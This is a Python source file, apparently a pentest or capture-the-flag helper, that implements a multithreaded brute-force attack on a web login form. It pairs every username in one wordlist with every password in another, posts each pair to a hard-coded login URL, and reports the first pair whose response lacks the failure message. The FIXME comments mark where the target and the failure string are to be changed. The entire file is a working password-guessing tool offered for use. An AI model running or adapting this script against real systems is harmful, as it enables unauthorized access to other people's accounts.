#!/usr/bin/env python3
# -*- coding: UTF-8 -*-

'''
auth: @cyhfvg https://github.com/cyhfvg
date: 2022/06/26

web brute script example.
'''

import os
import re
import time
import requests as req
import sys
import codecs
import traceback

import threading
import queue


def main():
    if len(sys.argv) <= 1:
        exit(1)

    # args parse {{{1
    user_file = sys.argv[1]
    pass_file = sys.argv[2]
    thread_cnt = 1
    if len(sys.argv) >= 4:
        thread_cnt = sys.argv[3]
    #}}}

    if not isWordlistReadable(user_file):
        print(f"{user_file} is not readable.")
        exit(1)
    elif not isWordlistReadable(pass_file):
        print(f"{pass_file} is not readable.")
        exit(1)

    producer = threading.Thread(target = credentialProducer, args = (user_file, pass_file))
    producer.start()
    for x in range(int(thread_cnt)):
        consumer = threading.Thread(target = brute)
        consumer.start()

def credentialProducer(user_file: str, pass_file: str) -> None:
    global que
    global produce_finish_flag

    user_fh = codecs.open(user_file, "r", "utf-8")
    pass_fh = codecs.open(pass_file, "r", "utf-8")
    pass_list = [word.strip() for word in pass_fh if not word.strip() == '']

    for user in [word.strip() for word in user_fh if not word.strip() == '']:
        for password in pass_list:
            que.put(f"{user} {password}")
    produce_finish_flag = True

def brute() -> None:
    global que
    global quit_flag
    global produce_finish_flag

    # FIXME: change this
    headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.92 Safari/537.36',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'http://10.10.11.104',
            'Referer': 'http://10.10.11.104/login.php'
            }
    url = "http://10.10.11.104/login.php"

    trd_id = threading.currentThread().ident
    while True:
        # found, quit
        if quit_flag:
            break
        if que.empty():
            if produce_finish_flag:
                break
            # wait for producer
            time.sleep(1)
            continue

        item = que.get().split(' ')
        user = item[0]
        password = item[1]
        try:
            # x-www-form-urlencoded
            params = {
                    'username': user,
                    'password': password
                    }

            # do request
            res = req.post(url, data = params, headers = headers, timeout = 50)

            #print(res.text)
            # FIXME: change this
            if res.text.find("Invalid Username or Password") == -1:
                # have no result : correct password
                print(f"\033[32m{trd_id}: found credential: {user} / {password} \033[0m")
                quit_flag = True
                # wait 5s, wait other thread quit
                time.sleep(5)
            else:
                print(f"{trd_id}: {user} {password} not correct")

        except Exception as why:
            traceback.print_exc()
            exit(1)

def isWordlistReadable(wordlist_file: str) -> bool:
    return os.access(wordlist_file, os.R_OK)

if __name__ == '__main__':
    quit_flag = False
    produce_finish_flag = False
    que = queue.Queue()
    main()
